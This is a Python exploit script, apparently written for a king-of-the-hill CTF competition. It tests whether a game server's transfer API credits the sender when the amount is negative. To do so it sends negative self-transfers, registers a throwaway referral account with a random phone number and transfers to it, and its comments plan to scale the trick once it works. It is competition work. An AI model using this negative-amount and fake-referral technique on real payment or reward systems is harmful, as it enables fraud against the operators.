#!/usr/bin/env python3
"""
NCTF26 KOTH — Reseau Fortune : test du TRANSFERT à montant négatif.

Hypothèse : transfer {to_code, montant<0} => 'sender -= montant' = crédit.
On teste sur NOS comptes seulement (self, puis notre filleul). Montant modeste
pour comprendre le mécanisme ; on scalera ensuite. Retry lent.
PAS de transfert vers une autre équipe (règle anti-sabotage).
"""
import json, time, urllib.request, urllib.error, random
from http.cookiejar import CookieJar

HOST  = "http://13.37.197.230:28493"
TOKEN = "6eefff4072981996"
AMT   = -1000000
DELAY, MAX = 8, 10

cj = CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def call(path, body=None, label=""):
    data = json.dumps(body).encode() if body is not None else None
    for attempt in range(1, MAX + 1):
        req = urllib.request.Request(HOST + path, data=data,
                                     headers={"Content-Type": "application/json"},
                                     method="POST" if body is not None else "GET")
        try:
            with opener.open(req, timeout=8) as r:
                txt = r.read().decode(errors="replace")
                print(f"  {label or path} -> {r.status} {txt[:300]}")
                try: return json.loads(txt)
                except Exception: return {}
        except urllib.error.HTTPError as e:
            b = e.read().decode(errors="replace")
            if e.code == 429:
                print(f"  {label or path} -> 429, retente {DELAY}s [{attempt}/{MAX}]"); time.sleep(DELAY); continue
            print(f"  {label or path} -> {e.code} {b[:300]}"); return {}
        except Exception as ex:
            print(f"  {label or path} -> erreur {ex}, retente {DELAY}s"); time.sleep(DELAY); continue
    print(f"  {label or path} -> abandon ({MAX} essais)"); return {}

print("1) join"); j = call("/api/join", {"token": TOKEN}, "join")
my = j.get("referral_code") or j.get("code")
print("   mon code :", my)

print(f"2) self-transfer montant={AMT}")
call("/api/transfer", {"to_code": my, "montant": AMT}, "transfer(self)")
print("3) état"); call("/api/me", label="me")

phone = "228" + "".join(random.choice("0123456789") for _ in range(8))
print(f"4) register filleul ({phone})")
reg = call("/api/register", {"phone": phone, "parrain_code": my}, "register")
f = reg.get("code")
if f:
    print(f"5) transfer vers NOTRE filleul {f} montant={AMT}")
    call("/api/transfer", {"to_code": f, "montant": AMT}, "transfer(filleul)")
    print("6) état final"); me = call("/api/me", label="me(final)")
    print()
    print(f"-> wallet={me.get('wallet')}, net_gain={me.get('net_gain')}")
    if (me.get("wallet") or 0) > 50000 or (me.get("net_gain") or 0) > 0:
        print("   TRANSFERT NÉGATIF CRÉDITE : générateur trouvé, on scalera en 1 requête.")
    else:
        print("   bloqué -> colle la sortie, on cible l'activation du filleul.")
